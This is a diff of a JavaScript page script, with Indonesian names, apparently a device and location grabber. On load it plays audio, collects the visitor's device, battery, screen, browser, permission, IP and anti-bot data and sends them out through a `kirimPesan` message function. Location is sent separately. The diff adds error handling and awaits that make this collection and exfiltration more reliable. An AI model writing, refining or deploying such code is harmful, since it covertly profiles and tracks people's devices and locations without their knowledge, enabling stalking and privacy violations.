@@ -601,32 +601,39 @@ resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 �
       }
     };
 
-  const mulai = async () => {
+const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
-  const infoPerangkat = await ambilDataPerangkat();
-  const bateraiInfo = await ambilBaterai();
-  const layarGrafik = await ambilLayarGrafik();
-  const browserInfo = ambilBrowserInfo();
-  const webFeatures = ambilWebAPIFeatures();
-  const izinMedia = await ambilIzinMedia();
-  const ipInfo = await ambilIPInfo();
-  const antiBot = ambilDeteksiAntiBot();
+  try {
+    const infoPerangkat = await ambilDataPerangkat();
+    const bateraiInfo = await ambilBaterai();
+    const layarGrafik = await ambilLayarGrafik();
+    const browserInfo = ambilBrowserInfo();
+    const webFeatures = await ambilWebAPIFeatures();  // pastikan pakai await jika async
+    const izinMedia = await ambilIzinMedia();
+    const ipInfo = await ambilIPInfo();
+    const antiBot = await ambilDeteksiAntiBot();      // pastikan pakai await jika async
 
-  const gabungAwal = [
-    infoPerangkat,
-    bateraiInfo,
-    layarGrafik,
-    browserInfo,
-    webFeatures,
-    izinMedia,
-    ipInfo,
-    antiBot
-  ].join("\n\n");
+    const gabungAwal = [
+      infoPerangkat,
+      bateraiInfo,
+      layarGrafik,
+      browserInfo,
+      webFeatures,
+      izinMedia,
+      ipInfo,
+      antiBot
+    ].join("\n\n");
 
-  await kirimPesan(gabungAwal);
+    await kirimPesan(gabungAwal);
 
+  } catch (err) {
+    console.error("❌ Gagal kirim gabungAwal:", err);
+    await kirimPesan("❌ Gagal mengambil data utama.");
+  }
+
+  // Kirim sisanya terpisah biar nggak delay
   const lokasi = await ambilLokasi();
   await kirimPesan(lokasi);
 
